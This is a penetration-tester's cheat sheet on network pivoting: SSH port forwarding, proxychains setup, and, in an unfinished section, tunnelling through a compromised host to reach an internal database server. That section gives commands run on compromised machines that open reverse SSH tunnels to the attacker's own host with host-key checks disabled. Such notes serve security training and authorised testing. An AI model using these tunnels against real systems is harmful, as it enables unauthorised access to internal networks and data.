# Pivoting

## SSH Port forwarding

**D**ynamic port forwarding (SOCKS proxy)
```bash
ssh -D <port> <user>@<viaHost>
```

E.g.  
```bash
ssh -D 1337 user@compromised.com
```

**L**ocal port forwarding
```bash
ssh -L <fromPort>:<toHost>:<toPort> <user>@<viaHost>
```

E.g.  
Accessing localhost:`1337` will load `google.com:80` via `myserver.com` using `user`s account.
```bash
ssh -L 1337:google.com:80 user@myserver.com
```

**R**emote port forwarding
```bash
ssh -R <fromPort>:<toHost>:<toPort> <user>@<viaHost>
```

E.g.  
Accessing myserver.com:`1337` will load `localhost:80` via `myserver.com` using `user`s account.
```bash
ssh -R 1337:localhost.com:80 user@myserver.com
```

### Verify 

```bash
netstat -tulpn
```

## proxychains

> A tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy.  
[GitHub - haad/proxychains: proxychains](https://github.com/haad/proxychains)

`/etc/proxychains.conf` or `./proxychains.conf`
```
socks5 127.0.0.1 1337
```

```bash
proxychains <cmd>
```

# TODO REVIEW:

## Create a tunnel to another machine through a compromised target

(from **me** to **db server** through **target 1**)

**[me]** <- external -> **[target 1]** <- internal ->**[db server]**

Generate ssh key pair (**me**)
```bash
ssh-keygen
```

Add to `authorized_keys` with restrictions (**me**)
```bash
from="<target-ip>",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty <pub-key>
```

Get Access to port 22 and 3306 on database server  (**target 1**)
```bash
ssh -f -N -R 1122:<db-ip>:22 -R 13306:<db-ip>:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i <priv-key-file> kali@<own-ip>
```

Verify 
```bash
sudo netstat -tulpn
```

E.g.
```
[...]
tcp	0	0 127.0.0.1:13306	0.0.0.:*	LISTEN	6740/sshd: kali
tcp	0	0 127.0.0.1:1122	0.0.0.:*	LISTEN	6740/sshd: kali
[...]
```

## Creating a stable reverse tunnel

(from **db server** back to **me**)

**[me]** <- external -> **[target 1]** <- internal ->**[db server]** <- smb share -> **[target 2]**

Generate ssh key pair (**db server**)
```bash
ssh-keygen
```

```bash
ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i <priv-key-file> kali@<own-ip>
```

Setup proxychains (**me**)
```bash
/etc/proxychains.conf
```

```
[...]
socks 127.0.0.1 1080
```
